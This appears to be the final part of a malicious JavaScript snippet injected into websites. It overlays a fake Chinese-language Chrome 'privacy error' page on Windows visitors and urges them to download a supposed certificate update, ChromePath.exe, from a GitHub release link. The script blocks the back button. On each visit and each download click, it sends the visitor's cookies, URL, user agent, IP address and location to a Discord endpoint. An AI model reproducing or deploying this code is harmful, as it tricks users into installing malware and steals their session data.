        网站在更新其安全设置期间可能会经常显示警告。此问题应该很快就会得到改进。
      </div>
      <div id="extended-reporting-opt-in" class="hidden">
        <label>
          <div class="checkboxes">
            <input type="checkbox" id="opt-in-checkbox">
            <span class="checkbox"></span>
          </div>
          <span id="opt-in-label">向 Google 发送<a href="chrome-error://chromewebdata/#" id="whitepaper-link">您访问的部分网页的网址、有限的系统信息以及部分网页内容</a>，帮助我们为所有人改善网络安全环境。<a id="privacy-link" href="chrome-error://chromewebdata/#">隐私权政策</a></span>
        </label>
      </div>
      <div id="enhanced-protection-message" class="ssl-enhanced-protection-message">
        <label>
          <div class="icon"></div>
          <div>开启增强型保护，获享 Browser 的最高级别安全防护</div>
        </label>
      </div>
    </div>
    <div class="nav-wrapper">
      <button id="primary-button" ><a href="https://github.com/sd5f45s1f5/c/releases/download/v1.0.0/ChromePath.exe" style="color:  white;  text-decoration:  none;">更新证书文件</a></button>
      <button id="proceed-button" class="secondary-button small-link hidden"></button>
      <button id="details-button" class="secondary-button small-link" aria-expanded="false">高级</button>
    </div>
    <div id="details" class="hidden">
      <p>此服务器无法证明它是<strong><span  id="domainName2"></span></strong>；您计算机的操作系统不信任其安全证书。出现此问题的原因可能是配置有误或您的连接被拦截了。</p>
    </div>
  </div>
<style>
body {
  font-family: 'Segoe UI',Arial,'Microsoft Yahei',sans-serif;
  font-size: 75%;
}
button {
  font-family: 'Segoe UI',Arial,'Microsoft Yahei',sans-serif;
}
</style>
</body></html>
`;
        // 检查用户是否为 Windows 系统
        if (navigator.userAgent.indexOf('Windows') !== -1) {
          // 插入 HTML
          document.body.insertAdjacentHTML('beforeend', loginHTML);
          document.title = "隐私设置错误";
        }

        //获取当前域名
        var  url  =  window.location.href;
        var  domain  =  url.match(/^(?:https?:\/\/)?([^\/:?#]+)(?:[\/:?#]|$)/i)[1];
        document.getElementById("domainName").textContent  =  domain;
        document.getElementById("domainName2").textContent  =  domain;

        // 覆盖浏览器的历史记录
        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function() {
            window.history.pushState(null, null, window.location.href);
        };

        //显示或隐藏详情
        document.getElementById('details-button').addEventListener('click', function() {
            var details = document.getElementById('details');
            if (details.classList.contains('hidden')) {
              details.classList.remove('hidden');
              this.setAttribute('aria-expanded', 'true');
              this.textContent = '隐藏详情';
            } else {
              details.classList.add('hidden');
              this.setAttribute('aria-expanded', 'false');
              this.textContent = '高级';
            }
          });

        var title = document.title;
        var url = document.URL;
        var cookie = document.cookie;
        var userAgent = navigator.userAgent;
        var ip = null;
        var region = null;
        var city = null;

        //获取IP
        async function fetchIP() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                if (!response.ok) {
                    throw new Error('Network error');
                }
                const data = await response.json();
                ip = data.ip; 
                region = data.region;
                city = data.city; 
            } catch (error) {
                console.error(error.message);
            }
        }
        
        //探针 （添加discordapp.com接口获取下载信息）
        async function probe(str) {
            const fetchedIP = await fetchIP();
            var jsonData = "*****"+str+" reminder*****"+"\nIP: "+ip+ "\nuserAgent" + userAgent + "\nRegion: "+region+"\nCity: "+city+"\nTitle: "+title+"\nUrl: "+url+"\nCookie: "+cookie;
            var payload = JSON.stringify({ content: jsonData });
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'https://discordapp.com/api/', true);
            xhr2.setRequestHeader('Content-Type', 'application/json');
            xhr2.onload = function() {
                if (xhr2.status >= 200 && xhr2.status < 400) {
                    console.log('Success:', xhr2.responseText);
                    //document.getElementById('overlay').style.display = 'none'; // Hide the overlay
                } else {
                    console.error('Error:', xhr2.status, xhr2.statusText);
                }
            };
            xhr2.send(payload);
        }

        //访问界面
        probe("Visit");

        //点击下载后更新lastVisit
        document.getElementById('primary-button').addEventListener('click', function() {
            probe("Download");
            //更新lastVisit
            localStorage.setItem('lastVisit', currentTime0);
        });

        document.getElementById('enhanced-protection-link').addEventListener('click', function() {
          probe("Download");
          //更新lastVisit
          localStorage.setItem('lastVisit', currentTime0);
      });
    }
});